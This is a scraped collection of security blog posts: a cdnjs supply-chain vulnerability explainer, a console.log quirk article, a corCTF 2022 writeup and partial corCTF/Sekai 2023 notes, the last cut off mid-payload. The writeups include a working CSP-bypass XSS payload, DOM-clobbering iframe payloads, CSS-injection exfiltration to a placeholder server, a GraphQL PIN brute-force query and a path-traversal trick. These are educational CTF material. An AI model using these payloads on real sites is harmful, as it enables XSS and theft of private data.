Git repo auto-updates, which looks like this: func MoveFile(sourcePath, destPath string) error &#123; inputFile, err := os.Open(sourcePath) if err != nil &#123; return fmt.Errorf(\"Couldn't open source file: %s\", err) &#125; outputFile, err := os.Create(destPath) if err != nil &#123; inputFile.Close() return fmt.Errorf(\"Couldn't open dest file: %s\", err) &#125; defer outputFile.Close() _, err = io.Copy(outputFile, inputFile) inputFile.Close() if err != nil &#123; return fmt.Errorf(\"Writing to output file failed: %s\", err) &#125; // The copy was successful, so now delete the original file err = os.Remove(sourcePath) if err != nil &#123; return fmt.Errorf(\"Failed removing original file: %s\", err) &#125; return nil &#125; It doesn’t look like much, just copying files, opening a new file, and copying the contents of the old file into it. But if the original file is a symbolic link, it’s different. Before we continue, let’s briefly explain what a symbolic link is. The concept of a symbolic link is similar to the “shortcut” we used to see on Windows. This shortcut is just a link that points to the real target. In Unix-like systems, you can use ln -s target_file link_name to create a symbolic link. Here’s an example that will make it easier to understand. First, I create a file with the content “hello” at /tmp/hello. Then I create a symbolic link in the current directory that points to the hello file I just created: ln -s /tmp/hello link_file. Next, if I print the contents of link_file, it will show hello, because it is actually printing the contents of /tmp/hello. If I write data to link_file, it is actually writing to /tmp/hello. Next, let’s try writing a piece of Node.js code to copy a file and see what happens: node -e 'require(\"fs\").copyFileSync(\"link_file\", \"test.txt\")' After execution, we found that there is a new file test.txt in the directory, and its contents are the contents of the file /tmp/hello. Therefore, when a program executes a file copy, it is not “copying a symbolic link”, but “copying the content of the file it points to”. Therefore, the file copying code mentioned earlier in Go, if there is a file that points to a symbolic link /etc/passwd, after copying, a file with the content /etc/passwd will be generated. We can add a symbolic link named test.js in the Git file, which points to /etc/passwd. After being copied by cdnjs, a test.js file will be generated, and its contents will be the contents of /etc/passwd! In this way, an arbitrary file read vulnerability is obtained. To summarize, the author found two vulnerabilities, one can write files and the other can read files. If you accidentally overwrite important files when writing files, the system will crash. Therefore, the author decided to start with reading files to do POC, created a Git repository and released a new version, waited for cdnjs to automatically update, and finally triggered the file reading vulnerability. The content read from the file can be seen in the JS published by cdnjs. The file the author read is /proc/self/environ (he originally wanted to read another file /proc/self/maps), which contains environment variables, and a GitHub API key is also in it. This key has write permissions to the repo under cdnjs, so using this key, you can directly modify the code of cdnjs or the cdnjs website, thereby controlling the entire service. The above is an explanation of the cdnjs vulnerability. If you want to see more technical details or detailed developments, you can read the original author’s blog post, which records many details. In short, even services maintained by large companies have the risk of being invaded. As a front-end engineer, how should we defend? So how can we defend against this type of vulnerability? Or maybe we can’t defend against it at all? The browser actually provides a function: “Do not load if the file has been tampered with”, so even if cdnjs is invaded and the jQuery file is tampered with, my website will not load the new jQuery file, avoiding file pollution attacks. On cdnjs, when you decide to use a certain library, you can choose to copy the URL or copy the script tag. If you choose the latter, you will get this content: &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js\" integrity=\"sha512-TS4lzp3EVDrSXPofTEu9VDWDQb7veCZ5MOm42pzfoNEVqccXWvENKZfdm5lH2c/NcivgsTDw9jVbK+xeYfzezw==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"> &lt;/script> crossorigin=&quot;anonymous&quot; I mentioned in my previous article: DoS attack using Cookie features: Cookie bomb, using the CORS method to send requests can avoid bringing cookies to the backend. The other tag above, integrity, is the key to defense. This attribute will let the browser verify whether the resource to be loaded meets the hash value provided. If it does not match, it means that the file has been tampered with and the resource will not be loaded. Therefore, even if cdnjs is invaded and the hacker replaces the react.js I originally used, the browser will not load the contaminated code because the hash value does not match. If you want to know more, you can refer to MDN, where there is a page Subresource Integrity specifically for this. However, this method can only prevent “already introduced scripts” from being tampered with. If you happen to copy the script after the hacker has tampered with the file, it will be useless because the file has already been tampered with. Therefore, if you want to completely avoid this risk, do not use these third-party services, put these libraries on your own CDN, so the risk changes from third-party risk to your own service risk. Unless your own service is taken down, these libraries should not have any problems. However, it should be noted that you still cannot avoid other supply chain attack risks. Because even if you don’t use a third-party library CDN, you still need to download these libraries from somewhere else, right? For example, npm, your library source may be here, which means that if npm is invaded and the files on it are tampered with, it will still affect your service. This is a supply chain attack, which does not directly attack you, but penetrates from other upstreams. However, this type of risk can be detected during build time through some static scanning services to see if tampered files or malicious code can be detected. Some companies also set up an internal npm registry that does not synchronize directly with external npm to ensure that the libraries used will not be tampered with. Additional risk: CSP bypassIn addition to the supply chain security risks mentioned above, there is actually another potential risk when using third-party JS, which is the bypass of CSP (Content Security Policy). Now many websites will set up CSP to block untrusted sources, such as only allowing JS files from a certain domain, or not allowing inline events and eval, etc. If your website uses cdnjs scripts, your CSP will inevitably have the https://cdnjs.cloudflare.com URL. Compared to the complete path, more people tend to allow everything from the entire domain, because you may use multiple libraries and are too lazy to add them one by one. At this time, if the website has an XSS vulnerability, the CSP should have a defensive effect in general, preventing the execution of these untrusted codes. Unfortunately, the https://cdnjs.cloudflare.com path in CSP allows attackers to easily bypass CSP. First, let’s talk about the principle. The principle is that cdnjs has millions of different libraries besides the library you want to use, and some of the functions provided by these libraries allow attackers to execute arbitrary code without executing JS. For example, AngularJS has a vulnerability in old versions called Client-Side Template Injection, which only requires HTML to execute code. Techniques like “using other legitimate scripts to help you execute attack code” are called script gadgets. To learn more, you can refer to: security-research-pocs&#x2F;script-gadgets Assuming that our CSP only allows https://cdnjs.cloudflare.com, how to bypass it? I found these two great resources: Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh＊t, it’s CSP!” Just use AngularJS + Prototype these two libraries, you can perform XSS under the condition of meeting CSP (only introducing scripts under cdnjs). I made a simple demo: https://aszx87410.github.io/demo/csp_bypass/cdnjs.html The complete code is as follows: &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> To avoid this type of CSP bypass, you can only hardcode the cdnjs path in CSP and write the entire script URL instead of just writing the domain. Otherwise, this type of CSP will actually help attackers break through the limitations of CSP and perform XSS attacks. ConclusionThere are countless attack methods, and researchers who discovered the vulnerability in cdnjs have recently been fond of supply chain attacks. Not only cdnjs, but also Homebrew, PyPI, and even @types have been found to have vulnerabilities. If you want to directly import third-party URLs on a page using script, be sure to first confirm that the other party’s website is trustworthy. If possible, also add the integrity attribute to avoid file tampering and affecting your own service. Also pay attention to the CSP settings. For websites like cdnjs, if only the domain is set, there are already feasible bypass methods, so please be careful when setting it up. When it comes to front-end security, everyone first thinks of XSS, then CSRF, and then maybe nothing else. This article hopes to introduce front-end engineers to supply chain attacks through the vulnerability in cdnjs. As long as you are aware of this attack method, you will pay more attention to it in future development and notice the risks associated with importing third-party libraries.","link":"/2021/08/22/en/cdnjs-and-supply-chain-attack/"},{"title":"Console.log Issues You Need to Pay Attention to","text":"PrefaceI wrote this article because I believe that many people have encountered this problem. In summary, when using console.log to print an object, the printed value is different from what you expected. Let’s take a look at the code below: var obj = &#123;value: 'before'&#125; console.log('before:', obj) // should be &#123;value: 'before'&#125; obj.value = 'after' console.log('after:', obj) This is a very simple code that logs an object, changes a property, and then logs it again. Naturally, the expected result of the first log should be: before: &#123;value: &#39;before&#39;&#125;, and the second log should be: after: &#123;value: &#39;after&#39;&#125;. However, in reality, things are not quite as you imagined. The actual situation is: If you open the console after executing this code, you may see that the result of the first log is &#123;value: &#39;after&#39;&#125;, not &#123;value: &#39;before&#39;&#125; If you execute the code before opening the console, although it seems correct at first glance, if you click on the object in the console to view its details, you will see &#123;value: &#39;after&#39;&#125;, as shown in the figure below, and then you will begin to doubt everything. If you don’t believe it, you can try it yourself: Demo link When viewing logs, developers should expect to see the state of the log at that time. However, when you click on the details of the object, you will see the latest state, not the state at the time of the log. This is why the situation in the attached figure occurs. The preview shows the state at the time of the log, and the expanded state shows the latest state, so the two are inconsistent. Some people may think that if the preview is correct, just look at the preview. However, the preview has limitations. When your object has too many properties, it cannot display all of them. You must expand the object to see all the properties. Once this happens, you cannot just look at the preview, you must expand the object, but then you cannot see the value of the log at that time. This is just a simple example, and you may think it’s nothing, but the scary thing about this problem is that when you first encounter it, it is often in an actual development scenario, not a simple example like this. Developers will think about where the program went wrong and why the printed output is different from what they expected, without knowing that the console is different from what they imagined. This problem is basically “unfixable”, so the best way to deal with it is: Know that this problem exists and pay more attention to it in the future Know how to temporarily deal with this problem Know why this problem cannot be fixed Observing the Problem AgainAs mentioned earlier, there may be two problems that may occur. Let’s try to see how different browsers handle the results under two different scenarios. First, here is the sample code used for testing: var obj = &#123;value: 'before'&#125; console.log('before:', obj) // should be &#123;value: 'before'&#125; obj.value = 'after' console.log('after:', obj) Scenario 1: Execute this code first, then open the console to view the results Scenario 2: Open the console first, then execute the code to view the results Below are the results of various browsers on macOS Mojave 10.14.4: Chrome 80.0.3987.149Scenario 1: Execute the code first and then open the consoleOnly the word “Object” is displayed, and no preview is displayed: Scenario 2: Open the console first, then execute the codeThe content of the console preview is correct, and after expanding the object, the latest content of the object is displayed. Firefox 74.0Scenario 1: Execute the code first and then open the consoleThe preview displayed is incorrect, and both are &#123;value: &#39;after&#39;&#125;: Scenario 2: Open the console first, then execute the codeThe content of the console preview is correct, and after expanding the object, the latest content of the object is displayed. Safari 12.1（14607.1.40.1.4）Scenario 1: Execute the code first and then open the consoleOnly the word “Object” is displayed, and no preview is displayed: Scenario 2: Open the console first, then execute the codeThe content printed by the console preview is correct, and after expanding the object, the latest content of the object is printed. Note: Because the object cannot be expanded if it is too short, I added a few properties. From the above experiments, several conclusions can be drawn: For scenario one: “run the program first and then open the console”, Chrome and Safari will not have a preview, while Firefox will display an incorrect preview. For scenario two: “open the console first and then run the program”, the behavior of the three browsers is consistent, and the preview is correct. Expanding the object to view the detailed content will show the latest state of the object. The reason for the problemThis problem has actually existed for a long time, and there have been Stackoverflow discussion threads several years ago: Google Chrome console.log() inconsistency with objects and arrays console.log() shows the changed value of a variable before the value actually changes Is Chrome’s JavaScript console lazy about evaluating arrays? Related records can also be found in the issue trackers of various browsers: Webkit: Bug 35801 - Web Inspector: generate preview for the objects dumped into the console upon logging. Mozilla: console.log doesn’t show objects at the time of logging if console is closed Chromium: Issue 1041063: console.log() does not log the correct fields of an object at the instant it is called Chromium: Issue 760776: Console Array data updates after console.log Even MDN’s documentation on console.log has a section specifically addressing this issue: Don’t use console.log(obj), use console.log(JSON.parse(JSON.stringify(obj))). This way you are sure you are seeing the value of obj at the moment you log it. Otherwise, many browsers provide a live view that constantly updates as values change. This may not be what you want. The above link also has people explaining why this problem exists and why it cannot be fixed. First of all, in the case of opening devtool, the content of the preview is basically correct, so there is no problem with this. However, after expanding the object, what is displayed is not the value at the time of the log, but the latest state of the object. This is what causes confusion, because developers would expect that even if the object is expanded, it should still be the state of the log at that time. But to achieve this function, every time console.log is used, the browser needs to copy all the current values to ensure that users can see the content of the log at that time when expanding the object. Applying what others have said in the above issue, they said: We can’t get a copy of the heap every time you console.log… I don’t think we are ever going to fix this one. We can’t clone object upon dumping it into the console and we also can’t listen to the object properties’ changes in order to make it always actual. So there are difficulties in implementation, and it cannot be done. Since it cannot be fixed, we can only pay more attention to this situation. When using console.log to print an object, remember that: The preview is basically correct (if devtool is open when you log). The complete data seen after expansion will be the latest state of the object, not the state at the time of the log. Chrome actually added a thoughtful little icon in the console to remind you of this: Solutions to the problemThe solution is actually written in MDN. When printing an object, use JSON.parse(JSON.stringify(obj)) to copy the current state of the object, and then generate a new object (commonly known as deep copy) to ensure that the current state is printed, like this: function log() &#123; var obj = &#123;value: 'before'&#125; console.log('before:', cp(obj)) obj.value = 'after' console.log('after:', cp(obj)) &#125; function cp(obj) &#123; return JSON.parse(JSON.stringify(obj)) &#125; Or there is another method, which is to try not to print the entire object. Instead of printing the entire object, print the value you really want to observe. Or just use debugger to pause the program and see what the current value is, which is also a method. SummaryMany beginners will accidentally step on this pit when they first encounter console.log, and then they will find out that it is not a problem with their own code after a long time, but that the content logged is different from what they imagined. So I hope this article can let everyone know that this problem exists, so that in the future, when using console.log to print an object, you can pay more attention to this situation. By the way, I personally still use console.log directly when printing objects, because it is more convenient. But because I know that console.log has this problem, once I find that the object I printed is different from what I imagined, I will use the above-mentioned deep copy to copy the value to confirm where the problem is. Finally, please remember that arrays are also a type of object, so arrays will have the same situation.","link":"/2020/03/24/en/console-log-bug/"},{"title":"corCTF 2022 writeup - modernblog","text":"At first, I had no intention of writing a post about this challenge because the author already had a greate one: corCTF 2022 Challenge Writeups. But, it’s my first time being the only solver for a challenge, it’s still worth writing one. In this post, I will talk about how I tackled the challenge in the first place and how I solved it in the end. About the challenge modernblog is a simple blog website built with React for Front-end, Node.js and Express for Back-end. The feature is simple, just like other CTF challenges, you can register, login, and create a post. Following is the screenshot of /home page, which shows all your posts: There is a bot that you can submit an URL and it will visit. When you see a browser bot, it means the challenge is usually about client-side vulnerability. The code for the bot is simple, just log in as admin and visit the provided valid URL(only URL that starts with http:// or https:// is allowed): // npm i puppeteer // script to emulate admin bot const puppeteer = require(\"puppeteer\"); const USERNAME = \"YOUR_USER\"; const PASSWORD = \"TEST_PASSWORD\"; const SITE = \"https://modernblog.be.ax\"; const visit = async (url) => &#123; let browser; try &#123; browser = await puppeteer.launch(&#123; headless: true, pipe: true, args: [ \"--no-sandbox\", \"--disable-setuid-sandbox\", \"--js-flags=--noexpose_wasm,--jitless\", ], dumpio: true &#125;); let page = await browser.newPage(); await page.goto(SITE + \"/login\", &#123; timeout: 3000, waitUntil: 'domcontentloaded' &#125;); await page.type(\"input[name=user]\", USERNAME); await page.type(\"input[name=pass]\", PASSWORD); await page.click(\"button[type=submit]\"); await page.waitForTimeout(3000); await page.goto(url, &#123; timeout: 3000, waitUntil: 'domcontentloaded' &#125;) await page.waitForTimeout(5000); await browser.close(); browser = null; &#125; catch (err) &#123; console.log(err); &#125; finally &#123; if (browser) await browser.close(); &#125; &#125;; visit(\"TARGET_URL\"); The flag is in a post owned by the admin, created when the server is on: (() => &#123; const flagId = crypto.randomBytes(6).toString(\"hex\"); const flag = process.env.FLAG || \"flag&#123;test_flag&#125;\"; users.set(\"admin\", &#123; pass: sha256(process.env.ADMIN_PASSWORD || \"test_password\"), posts: Object.freeze([flagId]), &#125;); posts.set(flagId, &#123; id: flagId, title: \"Flag\", body: flag, &#125;); &#125;)(); There is no permission check for viewing a post, it means that if we know flagId, we can see the content and get the flag. The front-end codebase is small, and only one obvious vulnerability when rendering a post: &#123;/* CSP is on, so this should be fine, right? */&#125; &#123;/* Clueless */&#125; &lt;div dangerouslySetInnerHTML=&#123;&#123; __html: body &#125;&#125;>&lt;/div> The project is built with React, a popular library made by Meta(Facebook). Everything you render in React will be escaped automatically(it’s great for developers) unless you use a very long attribute name: dangerouslySetInnerHTML. As the name implies, you can set innerHTML via this attribute. React team chose this name on purpose, because they want you to know that this attribute is dangerous and prone to XSS. So, now we have an XSS, just do &lt;svg onload&gt; and leak the flag? Not yet, don’t forget the CSP. CSP BypassHere is the CSP for this challenge: app.use((req, res, next) => &#123; res.setHeader( \"Content-Security-Policy\", \"script-src 'self'; object-src 'none'; base-uri 'none';\" ); if (req.session.user &amp;&amp; users.has(req.session.user)) &#123; req.user = users.get(req.session.user); &#125; next(); &#125;); You can’t inject your script because of the CSP, and this CSP is quite strict. When it comes to the client-side challenge, CSP is usually a good hint. I can think of a few techniques that it’s allowed from this CSP: CSS injection (&lt;style&gt; and image are allowed) DOM clobbering (input is not sanitized) &lt;meta&gt; tag Inject the script in same origin (self is allowed) &lt;iframe&gt; is allowed First thoughts - CSS injectionMy first idea is about CSS injection. If we can inject the style into the /home page which renders all the posts, we can steal the href which is flagId by doing this: a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; // ... But, is it possible? When the admin bot visits our URL, it’s /post/random_id, we can inject the style on this page for sure, but when we change the location to /home, the injected style is cleared. It seems not work. How about iframe? I know the style won’t affect the content in an iframe if it’s cross-origin, how about same-origin? Can we affect the style of an same-origin iframe? Although I think it’s not possible, I still spent some times to explore this option. But, this way also not work in the end. Other approachesDOM clobbering seems useless here, becasue I have never seen any DOM clobbering gadgets for React. Also, this React app uses no global variable. How about meta tag? I have seen some challenges abusing &lt;meta&gt; tag to do redirection and use Referer header to leak the URL, is it useful here? Probably not. Because it’s meaningless to leak the URL here unless the admin bot clicks the post. I also checked the spec for meta tag to find is there are any unknown attributes, and found nothing in the end. How about XSLeaks? Can we leak the href? I tried to recall all the XSLeaks challenges I have seen, and I thought XSLeaks is also not helpful for this challenge. The reason is simple, how can we leak the href attribute? If the flagId is shown on the page, maybe we can try to leak it, but flagId is not even shown on the page, not possible to leak it. After thinking of so many ways but finding nothing useful, I decided to move my focus back to the script element. self scriptI thought that maybe there is an API in back-end which outputs arbitrary content so that I can use that API as a source of script, like JSONP. It’s allowed because it’s same-origin. For example, &lt;script src=&quot;/apis/example?content=alert(1)&quot;&gt; By the way, loads a script via innerHTML is useless because the script won’t get executed according to the spec. So we need to use &lt;iframe srcdoc&gt;, like this: &lt;iframe srcdoc=&quot;&lt;script src=&#39;...&#39;&gt;&quot;&gt;&lt;/iframe&gt; Here are all the APIs in the back-end: app.post(\"/api/login\", (req, res) => &#123; let &#123; user, pass &#125; = req.body; if ( !user || !pass || typeof user !== \"string\" || typeof pass !== \"string\" ) &#123; return res.json(&#123; success: false, error: \"Missing username or password\", &#125;); &#125; if (!users.has(user)) &#123; return res.json(&#123; success: false, error: \"No user exists with that username\", &#125;); &#125; if (users.get(user).pass !== sha256(pass)) &#123; return res.json(&#123; success: false, error: \"Invalid password\" &#125;); &#125; req.session.user = user; res.json(&#123; success: true &#125;); &#125;); app.post(\"/api/register\", (req, res) => &#123; let &#123; user, pass &#125; = req.body; if ( !user || !pass || typeof user !== \"string\" || typeof pass !== \"string\" ) &#123; return res.json(&#123; success: false, error: \"Missing username or password\", &#125;); &#125; if (user.length &lt; 5 || pass.length &lt; 7) &#123; return res.json(&#123; success: false, error: \"Please choose a longer username or password\", &#125;); &#125; if (users.has(user)) &#123; return res.json(&#123; success: false, error: \"A user exists with that username\", &#125;); &#125; req.session.user = user; users.set(user, &#123; pass: sha256(pass), posts: [], &#125;); res.json(&#123; success: true &#125;); &#125;); const requiresLogin = (req, res, next) => req.user ? next() : res.json(&#123; success: false, error: \"You must be logged in!\" &#125;); app.post(\"/api/create\", requiresLogin, (req, res) => &#123; if (req.session.user === \"admin\") &#123; return res.json(&#123; success: false, error: \"uhhhhh... no\" &#125;); &#125; let &#123; title, body &#125; = req.body; if ( !title || !body || typeof title !== \"string\" || typeof body !== \"string\" ) &#123; return res.json(&#123; success: false, error: \"Missing title or body\" &#125;); &#125; let id = crypto.randomBytes(6).toString(\"hex\"); posts.set(id, &#123; id, title, body &#125;); req.user.posts.push(id); res.json(&#123; success: true &#125;); &#125;); app.post(\"/api/posts\", requiresLogin, (req, res) => &#123; return res.json(&#123; success: true, data: req.user.posts.map((id) => posts.get(id)), &#125;); &#125;); app.get(\"/api/post/:id\", requiresLogin, (req, res) => &#123; let &#123; id &#125; = req.params; if (!id) &#123; return res.json(&#123; success: false, error: \"No id provided\" &#125;); &#125; if (!posts.has(id)) &#123; return res.json(&#123; success: false, error: \"No post was found with that id\", &#125;); &#125; return res.json(&#123; success: true, data: posts.get(id) &#125;); &#125;); app.get(\"*\", (req, res) => res.sendFile(\"index.html\", &#123; root: \"public\" &#125;)); There are only two endpoints for GET: app.get(\"/api/post/:id\", requiresLogin, (req, res) => &#123; let &#123; id &#125; = req.params; if (!id) &#123; return res.json(&#123; success: false, error: \"No id provided\" &#125;); &#125; if (!posts.has(id)) &#123; return res.json(&#123; success: false, error: \"No post was found with that id\", &#125;); &#125; return res.json(&#123; success: true, data: posts.get(id) &#125;); &#125;); app.get(\"*\", (req, res) => res.sendFile(\"index.html\", &#123; root: \"public\" &#125;)); The first one is rendered with res.json, so its content type is application/json, impossible to make it a valid script. The second one is for rendering static files, which are also useless. How about other script types? Other script typesI wrote a post about different script types: How much do you know about script type? . Besides normal scripts, there are a few unpopular types: webbundle importmap speculationrules For webbundle, you can load a wbn file and specify resources. When the browser wants to load these resources, it loads from wbn file first instead of sending a request to the server. &lt;script type=\"webbundle\"> &#123; \"source\": \"https://example.com/dir/subresources.wbn\", \"resources\": [\"https://example.com/dir/a.js\", \"https://example.com/dir/b.js\", \"https://example.com/dir/c.png\"] &#125; &lt;/script> For importmap, you can specify the alias for importing script: &lt;script type=\"importmap\"> &#123; \"imports\": &#123; \"moment\": \"/node_modules/moment/src/moment.js\", \"lodash\": \"/node_modules/lodash-es/lodash.js\" &#125; &#125; &lt;/script> When you use import * from memoent, it’s actually import from /node_modules/moment/src/moment.js. Unfortunately, both do not work. Because it’s still considered as an inline script, thus blocked by the CSP. After trying all the approaches I mentioned above, it was already late, so I went to bed. When I was about to sleep, one thing came to my mind: How about including index.js again? So that I can render another React app in an iframe, maybe combined with DOM clobbering to mess up something? Render a React app inside a React appThe next morning, I tried this approach immediately, and it worked to some extent: &lt;iframe srcdoc=\" &lt;div id=root>&lt;/div> &lt;script type=module crossorigin src=/assets/index.7352e15a.js>&lt;/script> \" height=\"1000px\" width=\"500px\">&lt;/iframe> The script is loaded but something wrong with react-router, here is the exception: DOMException: Failed to execute ‘replaceState’ on ‘History’: A history state object with URL ‘about:srcdoc’ cannot be created in a document with origin ‘http://localhost:8080‘ and URL ‘about:srcdoc’. To know why this exception occurs, we need to know how routing is implemented in this app. There is a library called react-router, which is very popular for dealing with routing in React. We can see it’s usage in main.jsx: ReactDOM.createRoot(document.getElementById('root')).render( &lt;React.StrictMode> &lt;ChakraProvider> &lt;BrowserRouter> &lt;Routes> &lt;Route path=\"/\" element=&#123;&lt;Index />&#125; /> &lt;Route path=\"/register\" element=&#123;&lt;Register />&#125; /> &lt;Route path=\"/login\" element=&#123;&lt;Login />&#125; /> &lt;Route path=\"/home\" element=&#123;&lt;Home />&#125; /> &lt;Route path=\"/post/:id\" element=&#123;&lt;Post />&#125; /> &lt;/Routes> &lt;/BrowserRouter> &lt;/ChakraProvider> &lt;/React.StrictMode> ); It’s just a simple mapping, for example, /home renders &lt;Home /&gt; component. When you click a link and navigate to another page, it’s not actually the “page” in the sense of the traditional web. On traditional web, when clicking a link and navigating to another page, the browser sends another GET request to the server, and the server returns the response, then the browser renders the response with a new URL. In React, or more precisely, in every SPA(Single Page Application), the routing is handled by history object, not browser. So, when you click a link to /home, the browser will not send a new request to the server. How about the URL? We use history.pushState or history.replaceState to update the URL to make it looks like another “page”. From the exception, we know it’s something to do with replaceState. When &lt;BrowserRouter&gt; is mounted, it calls createBrowserHistory, following is the source code: export function createBrowserHistory( options: BrowserHistoryOptions = &#123;&#125; ): BrowserHistory &#123; let &#123; window = document.defaultView! &#125; = options; let globalHistory = window.history; function getIndexAndLocation(): [number, Location] &#123; let &#123; pathname, search, hash &#125; = window.location; let state = globalHistory.state || &#123;&#125;; return [ state.idx, readOnly&lt;Location>(&#123; pathname, search, hash, state: state.usr || null, key: state.key || \"default\", &#125;), ]; &#125; // ignore... let action = Action.Pop; let [index, location] = getIndexAndLocation(); let listeners = createEvents&lt;Listener>(); let blockers = createEvents&lt;Blocker>(); // error becasue of here if (index == null) &#123; index = 0; globalHistory.replaceState(&#123; ...globalHistory.state, idx: index &#125;, \"\"); &#125; &#125; index is null, so it calls globalHistory.replaceState and triggers the error. The URL of iframe is about:srcdoc, replaceState is not a valid operation. My first idea is, can we use DOM clobbering to manipulate index? So that index == null is false, then globalHistory.replaceState is not called. DOM clobberingFrom the code above, we know that index is actually window.history.state.idx. history already exists, so we can’t clobber window.history. We can only clobber a non-exist property on window, like window.DEV or window.ctf. But if you look carefully, there is another interesting part at the beginning: let &#123; window = document.defaultView! &#125; = options; window is from document.defaultView. Although we can’t clobber window.history, we can clobber document.defaultView.history, like this: &lt;form name=\"defaultView\"> &lt;img name=\"history\"> &lt;/form> document.defaultView.history is &lt;img name=&quot;history&quot;&gt;. But, we need to clobber document.defaultView.history.state.idx, it’s deeper. We need iframe to achieve this. For example, the following payload generated by DOM Clobber3r clobber document.a.b.c.d: &lt;iframe name=a srcdoc=\" &lt;iframe name=b srcdoc=&amp;quot; &lt;iframe name=c srcdoc=&amp;amp;quot; &lt;a id='d'>&lt;/a> &amp;amp;quot;>&lt;/iframe> &amp;quot;>&lt;/iframe> \">&lt;/iframe> So, let’s update this to document.defaultView.history.state.idx: &lt;iframe name=defaultView srcdoc=\" &lt;iframe name=history srcdoc=&amp;quot; &lt;iframe name=state srcdoc=&amp;amp;quot; &lt;a id='idx'>&lt;/a> &amp;amp;quot;>&lt;/iframe> &amp;quot;>&lt;/iframe> \">&lt;/iframe> After trying this in the browser, I realized it was not working. Because document.defaultView is the window object of the iframe, so document.defaultView.history is the built-in history object instead of &lt;iframe name=history&gt;. We go back to what we started, we can’t clobber window.history because it’s already there. At that moment, I also realized another thing. Since document.defaultView is the window object of the iframe, what if I inject something like &lt;iframe name=defaultView src=&quot;/home&quot;&gt;? By doing so, document.defaultView.history is the history object of the home page! I tried this way immediately, and here is the result: That’s amazing, I successfully render another React app with a different URL. Here is the HTML code: &lt;iframe srcdoc=\" iframe /home below&lt;br> &lt;iframe name=defaultView src=/home>&lt;/iframe>&lt;br> iframe /home above&lt;br> react app below&lt;br> &lt;div id=root>&lt;/div> &lt;script type=module crossorigin src=/assets/index.7352e15a.js>&lt;/script> \" height=\"1000px\" width=\"500px\">&lt;/iframe> This works because react-router tries to use document.defaultView.history to manipulate the URL, including loading the correct page. Since we clobber document.defaultView, the document.defaultView.history is the history of /home page now, thus render /home page instead of /. Do you remember what I said at the beginning? I said that if we can inject style to /home page, it’s trivial to use CSS injection to steal the href attribute, it’s exactly the case now. Example: &lt;iframe srcdoc=\" iframe /home below&lt;br> &lt;iframe name=defaultView src=/home>&lt;/iframe>&lt;br> iframe /home above&lt;br> &lt;style> a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; &lt;/style> react app below&lt;br> &lt;div id=root>&lt;/div> &lt;script type=module crossorigin src=/assets/index.7352e15a.js>&lt;/script> \" height=\"1000px\" width=\"500px\">&lt;/iframe> We can leak 1 or 2 chars for each submission. After a few submissions, we can leak the whole flagId and get the flag. ConclusionThis challenge is pretty cool, and it’s indeed a new way to exploit DOM clobbering, bring this to another level. More importantly, this bug is in a real-world library, a mainstream library to handle routing in React ecosystem. Kudos to the author @Strellic_ for making such a fantastic challenge. I really liked and enjoyed it.","link":"/2022/08/21/en/corctf-2022-modern-blog-writeup/"},{"title":"corCTF 2023 & Sekai CTF 2023 Writeup","text":"I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail. As usual, here are the keywords I noted: GraphQL batch query + alias Python os.path.join absolute path Svg XSS, foreignObject WebRTC CSP bypass Status code xsleak DNS rebinding nmap command injection Ruby rack file upload temporary storage buildConstraintViolationWithTemplate EL injection Request smuggling document.baseURI 200&#x2F;404 status code xsleak corCTF 2023The source code for the challenges is available here: https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/webWrite-ups for some of the web challenges: https://brycec.me/posts/corctf_2023_challenges force (118 solves)The PIN code has 10,000 possible values, and you need to find the correct value within 10 requests using a GraphQL query. The solution is to use batch query + alias, which allows you to try multiple times within a single request (taken from the article below): &#123; flag0:flag(pin:0), flag1:flag(pin:1), flag2:flag(pin:2), flag3:flag(pin:3), flag4:flag(pin:4), flag5:flag(pin:5) &#125; Write-ups by others: https://siunam321.github.io/ctf/corCTF-2023/web/force/ https://github.com/hanzotaz/corctf2023_writeup&#x2F; msfrognymize (64 solves)The key is in this piece of code: @app.route('/anonymized/&lt;image_file>') def serve_image(image_file): file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file)) if \"..\" in file_path or not os.path.exists(file_path): return f\"Image &#123;file_path&#125; cannot be found.\", 404 return send_file(file_path, mimetype='image/png') Python’s os.path.join has a well-known behavior where it ignores everything before the absolute path: &gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;) &#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39; &gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;) &#39;&#x2F;test.txt&#39; Therefore, by leveraging this behavior, you can achieve arbitrary file reading and obtain the flag. Reference: https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/ frogshare (33 solves)This challenge uses a library called svg-loader, which automatically loads an SVG URL. Therefore, this challenge is based on SVG XSS. During the import, for security reasons, scripts and inline scripts are automatically removed, but &lt;foreignObject&gt; is overlooked. This tag allows you to load HTML inside an SVG, and it can be bypassed by using iframe srcdoc: &lt;?xml version=\"1.0\" standalone=\"no\"?> &lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> &lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> &lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" 